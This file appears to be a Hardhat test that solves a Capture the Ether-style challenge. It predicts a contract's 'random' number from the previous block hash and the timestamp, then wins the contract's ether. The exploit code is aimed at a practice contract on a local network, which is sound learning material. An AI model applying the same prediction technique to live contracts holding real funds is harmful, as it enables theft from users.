import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */
    // Function guess uses blockhash to create variable answer
    // We can simulate the same function and pass the correct answer
    // uint8(keccak256(block.blockhash(block.number - 1), now));

    // Get current BlockNumber en calculate blockHash in same way
    const currentBlock = await ethers.provider.getBlock('latest');
    const previousBlockHash = (await ethers.provider.getBlock(currentBlock.number - 1)).hash;
    const currentTimestamp = currentBlock.timestamp;

    console.log('blockNumber:' + currentBlock.number);
    console.log('blockHash:' + previousBlockHash);
    console.log('currentTimestamp:' + currentTimestamp);

    // I tried to get the info from DebugInfo event but not working??

    // Calculate the "answer" like in the Solidity contract
    const encodedData = utils.defaultAbiCoder.encode(
      ['bytes32', 'uint256'],
      [previousBlockHash, currentTimestamp]
    );

    const answerHex = utils.keccak256(encodedData);

    // Log intermediate values for comparison
    console.log('Encoded Data:', encodedData);
    console.log('Keccak256 Hash:', answerHex);

    const answerFull = parseInt(answerHex);
    console.log('answerFull:', answerFull);

    const answer = parseInt(answerHex.slice(-2), 16); // Take the last byte to convert to uint8
    console.log('Calculated answer:', answer);

    // Make the guess
    await target.guess(answer, {
      value: ethers.utils.parseEther('1'),
    });

    expect(await target.isComplete()).to.equal(true);
  });
});
